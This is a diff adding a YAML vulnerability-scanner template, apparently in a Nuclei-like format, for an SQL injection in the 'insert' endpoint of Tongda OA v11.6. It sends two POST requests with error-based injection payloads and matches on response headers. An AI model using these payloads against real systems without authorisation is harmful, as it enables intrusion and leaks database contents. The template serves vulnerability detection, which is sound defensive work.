@@ -1,0 +1,48 @@
+id: tongda-insert-sqli
+brief:
+    title: Tongda OA v11.6 Insert Parameter - SQL Injection
+    by: SleepingBag945
+    level: high
+    about: Tongda OA v11.6 insert parameters contain SQL injection vulnerabilities, through which attackers can obtain sensitive database information
+    label:
+        - tongda
+        - sqli
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/general/document/index.php/recv/register/insert'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+      signs:
+        - "on": word
+          has:
+            - PHPSESSID=
+            - register_for/?rid=
+          in: header_1
+          need: all
+        - "on": word
+          has:
+            - register_for/?rid=
+          in: header_2
+          need: all
+    - verb: POST
+      to:
+        - '{{BaseURL}}/general/document/index.php/recv/register/insert'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER=
+      signs:
+        - "on": word
+          has:
+            - PHPSESSID=
+            - register_for/?rid=
+          in: header_1
+          need: all
+        - "on": word
+          has:
+            - register_for/?rid=
+          in: header_2
+          need: all
